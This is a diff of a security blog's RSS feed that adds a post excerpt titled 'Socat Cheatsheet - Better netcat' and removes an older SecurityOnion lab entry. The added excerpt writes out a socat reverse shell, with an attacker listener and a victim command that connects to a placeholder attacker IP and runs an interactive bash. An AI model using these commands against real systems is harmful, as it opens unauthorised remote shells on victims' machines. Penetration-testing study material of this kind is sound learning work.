@@ -4,7 +4,18 @@
         <link>/posts/</link>
         <description>All Posts | </description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>Securitynguyen@gmail.com (Nguyen Nguyen)</managingEditor>
-            <webMaster>Securitynguyen@gmail.com (Nguyen Nguyen)</webMaster><lastBuildDate>Thu, 08 Jun 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/posts/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>Securitynguyen@gmail.com (Nguyen Nguyen)</webMaster><lastBuildDate>Tue, 20 Jun 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>Socat Cheatsheet - Better netcat</title>
+    <link>/posts/socat-red-team-tool/</link>
+    <pubDate>Tue, 20 Jun 2023 00:00:00 &#43;0000</pubDate>
+    <author>Nguyen Nguyen</author>
+    <guid>/posts/socat-red-team-tool/</guid>
+    <description><![CDATA[Tool used to establish a more stabilize shell compare to netcat. Features:
+Used of the arrow key Allows for interactive commands such as sudo Use of CTRL + S, CTRL + C Reverse Shell for Linux Attacker:
+socat TCP-L:&lt;port&gt; FILE:tty,raw,echo=0 Victim: socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane Additional step: Open a new command prompt, and type stty-a, record the value of rows and columns
+Next, in your reverse/bind shell, type: stty rows &lt;number&gt;]]></description>
+</item>
+<item>
     <title>OS Detection/Traceroute</title>
     <link>/posts/os-detection-and-traceroute/</link>
     <pubDate>Thu, 08 Jun 2023 00:00:00 &#43;0000</pubDate>
@@ -77,14 +88,6 @@ Traceroute If you want Nmap to find the routers between you and the target, you 
     <author>Nguyen Nguyen</author>
     <guid>/posts/metasploitable2/</guid>
     <description><![CDATA[Today, I'm going configure Metasploitable3 (Linux) Network Configuration]]></description>
-</item>
-<item>
-    <title>SecurityOnion - Modern Cyber Range</title>
-    <link>/posts/securityonion-modern-cyber-range/</link>
-    <pubDate>Thu, 18 May 2023 00:00:00 &#43;0000</pubDate>
-    <author>Nguyen Nguyen</author>
-    <guid>/posts/securityonion-modern-cyber-range/</guid>
-    <description><![CDATA[In this post, I will be testing if I'm able to access the securityonion page, Check if my security onion have no access to the internet and check if it can communicate with other devices]]></description>
 </item>
 </channel>
 </rss>
